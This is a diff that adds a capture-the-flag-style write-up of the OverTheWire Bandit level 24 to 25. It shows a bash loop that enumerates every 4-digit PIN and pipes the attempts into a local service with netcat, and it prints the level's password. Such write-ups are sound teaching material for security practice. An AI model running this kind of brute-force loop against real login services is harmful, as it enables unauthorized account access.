@@ -1,0 +1,50 @@
+Bandit Level 24 → Level 25
+
+In this level, a service is running locally on port 30002. The service returns the password 
+for bandit25 only when it receives:
+The correct bandit24 password
+A valid 4-digit PIN
+Since the PIN is unknown and can range from 0000 to 9999, brute-forcing all possibilities is
+required.
+Instead of manually trying 10,000 PINs, I automated the process using a shell script and 
+sent all combinations to the service.
+
+Step 1: Create a Working Directory
+I first created a temporary directory to store my script:
+mkdir /tmp/bandit24
+cd /tmp/bandit24
+
+Step 2: Create the Brute-Force Script
+I created a script file:
+nano script.sh
+Inside the script, I added the following code:
+#!/bin/bash
+for i in {0..9}{0..9}{0..9}{0..9}
+do
+  echo "BANDIT24_PASSWORD $i"
+done
+
+This script generates all 4-digit PIN combinations from 0000 to 9999 and prints them along with the bandit24 password in the format expected by the service.
+
+Step 3: Make the Script Executable
+I changed the file permissions so the script could be executed:
+
+chmod +x script.sh
+
+Step 4: Send the Attempts to the Service
+
+I ran the script and piped its output directly into the service running on port 30002
+using netcat:
+./script.sh | nc localhost 30002
+
+Result
+
+The script automatically sent 10,000 login attempts to the service. The service
+tested each PIN, and when the correct PIN was reached, it responded with:
+
+Correct!
+The password of bandit25 is: iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
+
+Conclusion
+
+By automating the brute-force process with a shell script and piping the output into the service, I successfully retrieved the password for Bandit Level 25 without manual effort.
